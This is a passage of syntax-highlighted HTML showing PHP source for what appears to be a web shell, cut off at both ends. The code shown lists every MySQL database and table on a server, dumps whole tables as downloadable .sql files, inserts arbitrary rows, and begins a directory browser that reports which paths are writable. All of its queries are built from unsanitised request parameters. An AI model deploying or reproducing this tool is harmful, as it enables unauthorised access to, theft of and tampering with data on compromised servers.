          <span class="k">if</span><span class="p">(</span><span class="nv">$y</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="p">(</span><span class="mi">30</span><span class="o">*</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="nv">$y</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">=</span> <span class="mi">30</span><span class="o">*</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">])){</span>
            <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;tr&amp;gt;&quot;</span><span class="p">);</span>
            <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$fields</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
              <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT &quot;</span> <span class="o">.</span> <span class="nv">$fields</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; FROM &quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; WHERE &quot;</span> <span class="o">.</span> <span class="nv">$fields</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; = &#39;&quot;</span> <span class="o">.</span> <span class="nv">$x</span> <span class="o">.</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
              <span class="nv">$dat</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$sqlcon</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
              <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$dat</span><span class="p">)){</span>
                <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">);</span>
              <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
          <span class="p">}</span>
        <span class="p">}</span>
        <span class="nv">$y</span><span class="o">++</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/table&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
      <span class="k">for</span><span class="p">(</span><span class="nv">$z</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nv">$z</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">=</span><span class="nb">ceil</span><span class="p">(</span><span class="nv">$num_rows</span> <span class="o">/</span> <span class="mi">30</span><span class="p">);</span><span class="nv">$z</span><span class="o">++</span><span class="p">){</span>
        <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;a href=&#39;?act=sql&amp;db=&quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;table=&quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;p=&quot;</span> <span class="o">.</span> <span class="nv">$z</span> <span class="o">.</span> <span class="s2">&quot;&#39;&amp;gt;&quot;</span> <span class="o">.</span> <span class="nv">$z</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/a&amp;gt; | &quot;</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">elseif</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sqlf&#39;</span><span class="p">]){</span>
      <span class="k">switch</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sqlf&#39;</span><span class="p">]){</span>
        <span class="k">case</span> <span class="s2">&quot;dl&quot;</span><span class="o">:</span> <span class="nx">sqldownload</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="s2">&quot;ins&quot;</span><span class="o">:</span> <span class="nx">sqlinsert</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
        <span class="k">default</span><span class="o">:</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sqlf&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
      <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;table&amp;gt;&quot;</span><span class="p">);</span>
      <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SHOW TABLES FROM &quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">];</span>
      <span class="nv">$dat</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$sqlcon</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
      <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$dat</span><span class="p">)){</span>
        <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=&#39;?act=sql&amp;db=&quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;table=&quot;</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&quot;</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;[&amp;lt;a href=&#39;?act=sql&amp;db=&quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;table=&quot;</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span><span class="s2">&quot;&amp;sqlf=dl&#39;&amp;gt;Download&amp;lt;/a&amp;gt;]&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/table&amp;gt;&quot;</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span><span class="p">{</span>
    <span class="nv">$dbs</span><span class="o">=</span><span class="nb">mysql_list_dbs</span><span class="p">(</span><span class="nv">$sqlcon</span><span class="p">);</span>
    <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_object</span><span class="p">(</span><span class="nv">$dbs</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;a href=&#39;?act=sql&amp;db=&quot;</span> <span class="o">.</span> <span class="nv">$row</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Database</span> <span class="o">.</span> <span class="s2">&quot;&#39;&amp;gt;&quot;</span> <span class="o">.</span> <span class="nv">$row</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Database</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$sqlcon</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">sqldownload</span><span class="p">(){</span> <span class="c1">// Download sql file function</span>
  <span class="o">@</span><span class="nb">ob_flush</span><span class="p">;</span>
  <span class="nv">$sqlcon</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;:&#39;</span> <span class="o">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_port&#39;</span><span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_user&#39;</span><span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_password&#39;</span><span class="p">]);</span>
  <span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">],</span> <span class="nv">$sqlcon</span><span class="p">);</span>
  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SHOW COLUMNS FROM &quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">];</span>
  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$sqlcon</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
  <span class="nv">$fields</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
  <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
    <span class="nb">array_push</span><span class="p">(</span><span class="nv">$fields</span><span class="p">,</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Field&#39;</span><span class="p">]);</span>
    <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM &quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">],</span> <span class="nv">$sqlcon</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
  <span class="nv">$num_rows</span> <span class="o">=</span> <span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
  <span class="k">for</span><span class="p">(</span><span class="nv">$x</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nv">$x</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$num_rows</span><span class="p">;</span><span class="nv">$x</span><span class="o">++</span><span class="p">){</span>
    <span class="nv">$out</span> <span class="o">.=</span> <span class="s2">&quot;(&quot;</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$fields</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
      <span class="nv">$out</span> <span class="o">.=</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
      <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT &quot;</span> <span class="o">.</span> <span class="nv">$fields</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; FROM &quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; WHERE &quot;</span> <span class="o">.</span> <span class="nv">$fields</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; = &#39;&quot;</span> <span class="o">.</span> <span class="nv">$x</span> <span class="o">.</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
      <span class="nv">$dat</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$sqlcon</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
      <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$dat</span><span class="p">)){</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">){</span>
          <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;NULL&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$i</span> <span class="o">!=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$fields</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">){</span>
          <span class="nv">$out</span> <span class="o">.=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">r</span><span class="se">\\</span><span class="s2">n&quot;</span><span class="p">,</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&#39;, &quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span><span class="p">{</span>
          <span class="nv">$out</span> <span class="o">.=</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="nv">$out</span> <span class="o">.=</span> <span class="s2">&quot;);</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;-&quot;</span> <span class="o">.</span> <span class="nb">time</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;.sql&#39;</span><span class="p">;</span>
  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: application/octet-stream&quot;</span><span class="p">);</span>
  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-length: &quot;</span> <span class="o">.</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$out</span><span class="p">));</span>
  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-disposition: attachment; filename=&quot;</span> <span class="o">.</span> <span class="nv">$filename</span> <span class="o">.</span> <span class="s2">&quot;;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="nv">$out</span><span class="p">);</span>
  <span class="k">die</span><span class="p">();</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">sqlinsert</span><span class="p">(){</span>
  <span class="nx">style</span><span class="p">();</span>
  <span class="nv">$sqlcon</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;:&#39;</span> <span class="o">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_port&#39;</span><span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_user&#39;</span><span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_password&#39;</span><span class="p">]);</span>
  <span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">],</span> <span class="nv">$sqlcon</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ins&#39;</span><span class="p">]){</span>
    <span class="nb">unset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ins&#39;</span><span class="p">]);</span>
    <span class="nv">$fields</span> <span class="o">=</span> <span class="nb">array_flip</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
    <span class="nv">$f</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">,</span> <span class="nv">$fields</span><span class="p">);</span>
    <span class="nv">$v</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">);</span>
    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO &quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot; (&quot;</span> <span class="o">.</span> <span class="nv">$f</span> <span class="o">.</span> <span class="s2">&quot;) VALUES (&quot;</span> <span class="o">.</span> <span class="nv">$v</span> <span class="o">.</span> <span class="s2">&quot;)&quot;</span><span class="p">;</span>
    <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$sqlcon</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Row inserted.&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&amp;lt;a href=&#39;?act=sql&amp;db=&quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;table=&quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&#39;&amp;gt;Go back&amp;lt;/a&amp;gt;&quot;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SHOW COLUMNS FROM &quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">];</span>
  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$sqlcon</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
  <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="nv">$fields</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;form method=&#39;POST&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;table&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
    <span class="nb">array_push</span><span class="p">(</span><span class="nv">$fields</span><span class="p">,</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Field&#39;</span><span class="p">]);</span>
    <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;&quot;</span> <span class="o">.</span> <span class="nv">$fields</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=&#39;text&#39; name=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$fields</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&#39;&amp;gt;&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/table&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&amp;lt;input type=&#39;submit&#39; value=&#39;Insert&#39; name=&#39;ins&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/form&amp;gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">nicesize</span><span class="p">(</span><span class="nv">$size</span><span class="p">){</span>
  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$size</span><span class="p">){</span><span class="k">return</span> <span class="k">false</span><span class="p">;}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1073741824</span><span class="p">){</span><span class="k">return</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="nv">$size</span> <span class="o">/</span> <span class="mi">1073741824</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot; GB&quot;</span><span class="p">);}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1048576</span><span class="p">){</span><span class="k">return</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="nv">$size</span> <span class="o">/</span> <span class="mi">1048576</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot; MB&quot;</span><span class="p">);}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1024</span><span class="p">){</span><span class="k">return</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="nv">$size</span> <span class="o">/</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot; KB&quot;</span><span class="p">);}</span>
  <span class="k">else</span><span class="p">{</span><span class="k">return</span><span class="p">(</span><span class="nv">$size</span> <span class="o">.</span> <span class="s2">&quot; B&quot;</span><span class="p">);}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">files</span><span class="p">(</span><span class="nv">$dir</span><span class="p">){</span> <span class="c1">// File manipulator function</span>
  <span class="nx">style</span><span class="p">();</span>
  <span class="k">global</span> <span class="nv">$self</span><span class="p">,</span> <span class="nv">$curdir</span><span class="p">;</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$dir</span><span class="o">==</span><span class="s2">&quot;&quot;</span><span class="p">){</span><span class="nv">$dir</span> <span class="o">=</span> <span class="nv">$curdir</span><span class="p">;}</span>
  <span class="nv">$dirx</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$dir</span><span class="p">);</span>
  <span class="nv">$files</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
  <span class="nv">$folders</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;form method=&#39;GET&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;input type=&#39;text&#39; name=&#39;dir&#39; value=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$dir</span> <span class="o">.</span> <span class="s2">&quot;&#39; size=&#39;40&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;input type=&#39;submit&#39; value=&#39;Go&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/form&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;h4&amp;gt;File list for &quot;</span><span class="p">);</span>
  <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$dirx</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
    <span class="nv">$totalpath</span> <span class="o">.=</span> <span class="nv">$dirx</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;/&quot;</span><span class="p">;</span>
    <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;a href=&#39;?dir=&quot;</span> <span class="o">.</span> <span class="nv">$totalpath</span> <span class="o">.</span> <span class="s2">&quot;&#39;&amp;gt;</span><span class="si">$dirx[$i]</span><span class="s2">&amp;lt;/a&amp;gt;&quot;</span> <span class="o">.</span> <span class="s2">&quot;/&quot;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/h4&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;table&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;th&amp;gt;File Name&amp;lt;th&amp;gt;File Size&amp;lt;/th&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$handle</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">while</span> <span class="p">(</span><span class="k">false</span> <span class="o">!=</span> <span class="p">(</span><span class="nv">$link</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">)))</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$link</span><span class="p">)){</span>
        <span class="nv">$file</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$link</span><span class="p">)){</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;perm&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;write&#39;</span><span class="p">;}</span>
        <span class="k">elseif</span><span class="p">(</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$link</span><span class="p">)){</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;perm&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;read&#39;</span><span class="p">;}</span>
        <span class="k">else</span><span class="p">{</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;perm&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;none&#39;</span><span class="p">;}</span>
        <span class="k">switch</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;perm&#39;</span><span class="p">]){</span>
